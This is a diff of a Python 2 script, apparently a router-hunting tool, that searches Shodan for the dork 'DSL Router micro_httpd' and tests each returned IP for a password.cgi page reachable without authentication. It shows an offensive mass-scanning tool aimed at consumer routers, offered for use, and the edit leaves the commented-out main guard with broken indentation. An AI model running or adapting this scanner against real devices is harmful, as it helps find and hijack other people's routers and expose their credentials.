@@ -5,15 +5,15 @@
 #     |  _| . | | |  _| -_|   |
 #     |_| |___|___|_| |___|_|_|
 #         
-# Page: www.facebook.com/InurlBrasil
-# Blog: blog.inurl.com.br
 # jh00nbr
+# 
+# Fix by rand0m1ze - https://github.com/rand0m1ze
 
 #Dependencias
 # apt-get install python-shodan 
 # easy_install shodan
 
-from shodan import WebAPI
+import shodan
 import re,socket
 import os
 import sys
@@ -28,8 +28,6 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-#Api Key Shodan
-key = "suakey"
  
 os.system('clear')
 print '               _       _    '
@@ -37,7 +35,7 @@ print '   ___ ___ _ _| |_ ___| |_  '
 print '  |  _| . | | |  _| -_|   |  '
 print '  |_| |___|___|_| |___|_|_|  '
 print '                              '
-print '  * Procura por modelo de roteadores vulneraveis na porta 80 com pagina password.cgi sem autentificação'
+print '  * Search for model vulnerable routers on port 80 with page password.cgi without authentication'
 print ' /----------------------------'
 
  
@@ -64,17 +62,17 @@ def checar(ip):
  
                  return False
 
-if __name__ == "__main__":
-	
-api = WebAPI(key)
-res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
+#if __name__ == "__main__":
+	                     
+api = shodan.Shodan("SHODAN_API_KEY")  #Shodan API key with quotations
+res = api.search('DSL Router micro_httpd') #Shodan Dork
 i = 1
 try:
-         while i <= 100: #Vai printar apenas 100 resultados pela API ser free
+         while i <= 100: #Will printar only 100 results for the API to be free
  
                  for ips in res['matches']:
  
-                         print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
+                         print '[!] Testing http://%s' % ips['ip'] + bcolors.WARNING + '  :('+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.FAIL, ips['timestamp'], bcolors.ENDC, bcolors.HEADER, ips['org'], bcolors.ENDC
  
                          if(checar(ips['ip'])):
 							 
